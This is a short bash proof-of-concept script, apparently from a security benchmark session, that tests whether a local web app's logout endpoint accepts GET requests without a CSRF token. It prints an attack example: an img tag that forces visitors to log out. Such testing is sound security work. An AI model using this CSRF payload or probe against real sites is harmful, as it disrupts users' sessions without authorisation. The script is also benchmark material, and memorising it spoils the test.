#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint - logout can be triggered via GET request without CSRF token
# Target: ./repo
# Created: 2025-12-01T16:07:23.988Z
# Session: benchmark-XBEN-056-24-minbd206

# CSRF Vulnerability POC: Logout via GET Request
# This script demonstrates that the logout endpoint accepts GET requests
# without CSRF token protection, allowing forced logout attacks

TARGET_URL="${1:-http://localhost:8081}"
LOGOUT_ENDPOINT="/accounts/logout/"

echo "[*] CSRF Logout Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Endpoint: $LOGOUT_ENDPOINT"
echo ""

# Step 1: Check if logout endpoint responds to GET request
echo "[+] Step 1: Testing GET request to logout endpoint..."
echo "[*] Command: curl -i $TARGET_URL$LOGOUT_ENDPOINT"
echo ""

RESPONSE=$(curl -i "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)

echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check if we got a 302 redirect (indicating successful logout)
if echo "$RESPONSE" | grep -q "302 Found"; then
    echo "[✓] VULNERABLE: Logout endpoint responds to GET request with 302 redirect"
    echo "[✓] This allows CSRF attacks via img tags, link clicks, etc."
    echo ""
    echo "[!] Attack Example:"
    echo "    Attacker could include in malicious page:"
    echo "    <img src='http://target/accounts/logout/' />"
    echo "    Any user visiting the page would be logged out automatically"
    exit 0
elif echo "$RESPONSE" | grep -q "405\|Method Not Allowed"; then
    echo "[✗] NOT VULNERABLE: Logout endpoint rejects GET requests with 405"
    exit 1
else
    echo "[?] UNEXPECTED: Received response:"
    echo "$RESPONSE"
    exit 2
fi